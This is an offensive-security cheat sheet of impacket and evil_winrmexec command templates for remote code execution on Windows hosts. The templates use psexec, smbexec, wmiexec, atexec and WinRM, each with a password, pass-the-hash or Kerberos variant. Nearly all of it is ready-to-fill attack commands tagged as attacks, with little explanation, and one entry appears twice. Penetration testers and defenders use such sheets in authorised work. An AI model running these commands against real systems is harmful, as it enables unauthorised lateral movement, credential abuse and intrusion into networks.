# impacket

% impacket, windows, exec

## PSEXEC with username
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)
```
impacket-psexec <DOMAIN>/'<USER>':'<PASSWORD>'@<IP>
```

## PSEXEC with pass the Hash (pth)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)
```
impacket-psexec -hashes <HASH> '<USER>'@<IP>
```

## PSEXEC with kerberos
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)
```
export KRB5CCNAME=<ccache_file>; impacket-psexec -dc-ip <dc_ip> -target-ip <IP> -no-pass -k <DOMAIN>/'<USER>'@<target_name>
```

## SMBEXEC with username
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
impacket-smbexec <DOMAIN>/'<USER>':'<PASSWORD>'@<IP>
```

## SMBEXEC with pass the Hash (pth)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
impacket-smbexec -hashes <HASH> '<USER>'@<IP>
```

## SMBEXEC with kerberos
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
export KRB5CCNAME=<ccache_file>; impacket-smbexec -dc-ip <dc_ip> -target-ip <IP> -no-pass -k <DOMAIN>/'<USER>'@<target_name>
```

## wmiexec
#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
Execute a command shell without touching the disk or running a new service using DCOM
```
impacket-wmiexec <DOMAIN>/'<USER>':'<PASSWORD>'@<IP>
```

## wmiexec  with pass the hash (pth) 
#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  

Execute a command shell without touching the disk or running a new service using DCOM
```
impacket-wmiexec -hashes <HASH> '<USER>'@<IP>
```

## atexec - execute command view the task scheduler 
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
Using \pipe\atsvc via SMB
```
impacket-atexec <DOMAIN>/'<USER>':'<PASSWORD>'@<IP> 'command'
```

## atexec pass the hash (pth)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
Execute command view the task scheduler (using \pipe\atsvc via SMB)
```
impacket-atexec -hashes <HASH> '<USER>'@<IP> 'command'
```

# impacket-wmiexec

## impacket-wmiexec - login with creds
```
impacket-wmiexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC>'
```

## impacket-wmiexec - login with hash
```
impacket-wmiexec -hashes '<HASH>' '<USERNAME>@<DC>'
```


# evil_winrmexec

## evil_winrmexec - login with creds
```
evil_winrmexec.py <DOMAIN>@<USERNAME>:'<PASSWORD>'@<DC>
```

## evil_winrmexec - login with creds
```
evil_winrmexec.py <DOMAIN>@<USERNAME>:'<PASSWORD>'@<DC>
```

## evil_winrmexec - login with Kerberos
```
evil_winrmexec.py <DOMAIN>@'<USERNAME>' -k -no-pass
```